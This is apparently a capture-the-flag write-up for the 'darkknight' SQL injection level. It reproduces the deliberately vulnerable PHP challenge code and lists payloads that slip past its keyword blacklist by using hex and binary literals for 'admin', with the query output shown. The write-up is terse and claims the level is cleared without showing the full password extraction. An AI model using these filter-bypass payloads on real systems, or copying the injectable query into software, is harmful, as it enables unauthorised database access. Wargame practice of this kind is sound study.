```

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>

```
BLACKLIST= substr, ascii, admin

PAYLOAD: ?pw=1&no=0 or id like 0x61646d696e
OUTPUT: select id from prob_darkknight where id='guest' and pw='1' and no=0 or id like 0x61646d696e#
Hello Admin

PAYLOAD: ?pw=1&no=0 or id like 0b0110000101100100011011010110100101101110
OUTPUT: select id from prob_darkknight where id='guest' and pw='1' and no=0 or id like 0b0110000101100100011011010110100101101110
Hello Admin

OUTPUT:
Hello Admin
Darkknight clear


Darkknight clear
